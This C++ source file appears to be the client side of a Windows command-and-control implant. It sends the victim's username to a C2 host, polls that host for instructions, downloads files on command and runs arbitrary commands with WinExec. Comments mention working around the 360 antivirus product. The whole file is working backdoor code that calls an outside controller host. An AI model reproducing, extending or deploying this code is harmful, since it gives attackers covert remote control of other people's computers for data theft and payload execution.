#include "stdafx.h"
#include "api.h"
#include "http.h"
#include "json.h"
#include "utils.h"
#include <Lmcons.h>

//#pragma comment(lib, "shlwapi.lib")

void GetApiId()
{

	TCHAR username[UNLEN + 2];
	DWORD usernameLength = UNLEN + 2;
	// TCHAR username[MAX_PATH + 1];
	// DWORD usernameLength = MAX_PATH + 1;

	LPSTR postData = NULL;
	//BOOL isAdmin = IsUserAnAdmin();

	LPSTR usernameStr = NULL;
	DWORD usernameStrLen = 0;
	ZeroMemory(username, sizeof(username));

	// if you f**ked by 360, consider getting username from user path
	GetUserName(username, &usernameLength);
	// if you f**ked by 360 again, using SHGetFolderPath
	// GetEnvironmentVariable(L"HOMEPATH", username, MAX_PATH + 1);
	// SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, username);

	usernameStrLen = GetUTF8Length(username);
	usernameStr = new char[usernameStrLen];
	ZeroMemory(usernameStr, usernameStrLen);
	WideCharToUTF8(username, usernameStr, usernameStrLen);
	
	// build json object
	cJSON* data = cJSON_CreateObject();
	// TODO: error handler
	cJSON_AddItemToObject(data, "method", cJSON_CreateString("register"));
	cJSON_AddItemToObject(data, "username", cJSON_CreateString(usernameStr));
	
	postData = cJSON_Print(data);
	//WriteStrLog(postData);
	sendLog(postData);
	
	// clean
	delete[] usernameStr;
	delete[] postData;
	cJSON_Delete(data);
}

BOOL sendLog(LPCSTR postData)
{
	LPSTR dataReceived = new char[MAX_HTTP_RESPONSE_SIZE + 1];
	BOOL reponseStatus = FALSE;
	ZeroMemory(dataReceived, MAX_HTTP_RESPONSE_SIZE + 1);
	reponseStatus = Request(CCHOST, CCPORT, L"POST", L"app/test", L"Connection: close\r\nContent-Type: application/json\r\n", (LPVOID)postData, strlen(postData), dataReceived);
	delete[] dataReceived;
	return reponseStatus;
}

void CC()
{
	LPSTR dataReceived = new char[MAX_HTTP_RESPONSE_SIZE + 1];
	ZeroMemory(dataReceived, MAX_HTTP_RESPONSE_SIZE + 1);
	Request(CCHOST, CCPORT, L"GET", L"app/cc", L"Connection: close\r\n", NULL, 0, dataReceived);
	ProcessAPI(dataReceived);
}


void ProcessAPI(LPSTR resp)
{
	// parse json
	cJSON *json = cJSON_Parse(resp);
	cJSON *method = cJSON_GetObjectItemCaseSensitive(json, "method");
	cJSON *extra = NULL;
	// for download
	TCHAR uri[256];
	TCHAR filepath[MAX_PATH + 1];

	if(! cJSON_IsString(method) || !method->valuestring) {
		goto end;
	}
	switch (method->valuestring[0]) {
	case 'd':
		// download
		ZeroMemory(uri, sizeof(uri));
		ZeroMemory(filepath, sizeof(filepath));
		extra = cJSON_GetObjectItemCaseSensitive(json, "uri");
		if (!cJSON_IsString(extra) || !extra->valuestring) {
			goto end;
		}
		UTF8ToWideChar(extra->valuestring, uri, 256);
		extra = cJSON_GetObjectItemCaseSensitive(json, "file");
		if (!cJSON_IsString(extra) || !extra->valuestring) {
			goto end;
		}
		UTF8ToWideChar(extra->valuestring, filepath, 256);
		if (Download(CCHOST, CCPORT, uri, filepath)) {
			goto methodsucc;
		}
		else {
			goto end;
		}
		break;
	case 'r':
		// run

		extra = cJSON_GetObjectItemCaseSensitive(json, "cmd");
		if (!cJSON_IsString(extra) || !extra->valuestring) {
			goto end;
		}
		WinExec(extra->valuestring, SW_SHOW);
		break;
	default:
		WriteStrLog("unknown command: ");
		WriteStrLog(resp);
		WriteStrLog("\n");
		goto end;
	}
methodsucc:
	sendLog("{\"method\": \"c2log\", \"msg\": \"success\"}");
end:
	cJSON_Delete(json);

}